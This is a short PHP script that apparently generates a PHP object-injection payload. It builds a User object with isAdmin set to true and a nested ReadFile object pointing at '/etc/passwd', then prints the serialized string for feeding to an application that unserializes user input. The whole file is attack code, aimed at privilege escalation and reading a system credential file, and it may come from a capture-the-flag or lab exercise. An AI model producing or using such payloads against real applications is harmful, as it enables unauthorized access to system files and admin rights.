<?php

class ReadFile
{
        public function __construct()
        {
                $this->filename = '/etc/passwd';
        }
}

class User
{
        public function __construct()
        {
                $this->username = new ReadFile();
                $this->isAdmin = True;
        }
}

$obj = new User();
echo serialize($obj);
echo "\n";


?>
